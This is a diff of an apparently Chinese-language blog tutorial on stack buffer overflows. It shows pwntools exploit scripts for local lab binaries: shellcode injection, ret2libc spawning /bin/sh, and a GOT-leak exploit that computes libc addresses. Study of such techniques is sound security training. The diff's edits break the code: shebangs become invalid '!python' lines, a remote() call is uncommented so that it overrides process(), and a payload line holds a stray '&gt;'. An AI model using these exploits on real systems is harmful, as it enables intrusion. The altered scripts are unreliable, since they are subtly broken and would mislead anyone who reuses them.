@@ -180,8 +180,7 @@
 <p><img src="http://p1.bpimg.com/567571/5f09a62aba81a7a9.png" alt=""></p>
 <p>现在溢出点，shellcode和返回值地址都有。可以写exp了，最终测试代码如下:</p>
 <blockquote>
-<p>#!python</p>
-<p>#!/usr/bin/env python<br>from pwn import *</p>
+<p>!python<br>!/usr/bin/env python<br>from pwn import *</p>
 <p>p = process(‘./test’)<br>ret = 0xbffff029</p>
 <p>shellcode = “\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73”<br>shellcode += “\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0”<br>shellcode += “\x0b\xcd\x80”</p>
 <p> p32(ret) == struct.pack(“&lt;I”,ret)<br> 对ret进行编码，将地址转换成内存中的二进制存储形式<br>payload = shellcode + ‘A’ * (140 - len(shellcode)) + p32(ret)</p>
@@ -214,8 +213,7 @@
 </blockquote>
 <p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp：</p>
 <blockquote>
-<p>#!python</p>
-<p>#!/usr/bin/env python<br>from pwn import *</p>
+<p>!python<br>!/usr/bin/env python<br>from pwn import *</p>
 <p>p = process(‘./level2’)<br>p = remote(‘127.0.0.1’,10002)</p>
 <p>ret = 0xdeadbeef<br>systemaddr=0xb7e5f460<br>binshaddr=0xb7f81ff8</p>
 <p>payload =  ‘A’*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)</p>
@@ -232,17 +230,18 @@
 <p><img src="http://i1.piimg.com/567571/eb73f9b80519ade1.png" alt=""></p>
 <p>最后写exp：</p>
 <blockquote>
-<p>#!python</p>
-<p>#!/usr/bin/env python</p>
+<p>!python</p>
+<p>!/usr/bin/env python</p>
 <p>from pwn import *</p>
 <p>libc = ELF(‘libc.so’)<br>elf = ELF(‘test3’)</p>
-<p>p = process(‘./test3’)</p>
-<p>#p = remote(‘127.0.0.1’, 10003)</p>
+<p>p = process(‘./test3’)<br>p = remote(‘127.0.0.1’, 10003)</p>
 <p>plt_write = elf.symbols[‘write’]<br>print ‘plt_write= ‘ + hex(plt_write)<br>got_write = elf.got[‘write’]<br>print ‘got_write= ‘ + hex(got_write)<br>vulfun_addr = 0x0804844d<br>print ‘vulfun= ‘ + hex(vulfun_addr)</p>
 <p>payload1 = ‘a’*140 + p32(plt_write) + p32(vulfun_addr) + &gt; p32(1) +p32(got_write) + p32(4)</p>
 <p>print “\n###sending payload1 …###”<br>p.send(payload1)</p>
 <p>print “\n###receving write() addr…###”<br>write_addr = u32(p.recv(4))<br>print ‘write_addr=’ + hex(write_addr)</p>
-<p>print “\n###calculating system() addr and \”/bin/sh\” addr…###”<br>system_addr = write_addr - (libc.symbols[‘write’] - libc.symbols[‘system’])<br>print ‘system_addr= ‘ + hex(system_addr)<br>binsh_addr = write_addr - (libc.symbols[‘write’] - next(libc.search(‘/bin/sh’)))<br>print ‘binsh_addr= ‘ + hex(binsh_addr)</p>
+<p>print “\n###calculating system() addr and \”/bin/sh\” addr…###”<br>system_addr = write_addr - (libc.symbols[‘write’] - libc.symbols[‘system’])</p>
+<p>print ‘system_addr= ‘ + hex(system_addr)</p>
+<p>binsh_addr = write_addr - (libc.symbols[‘write’] - next(libc.search(‘/bin/sh’)))<br>print ‘binsh_addr= ‘ + hex(binsh_addr)</p>
 <p>payload2 = ‘a’*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</p>
 <p>print “\n###sending payload2 …###”<br>p.send(payload2)</p>
 <p>p.interactive()</p>
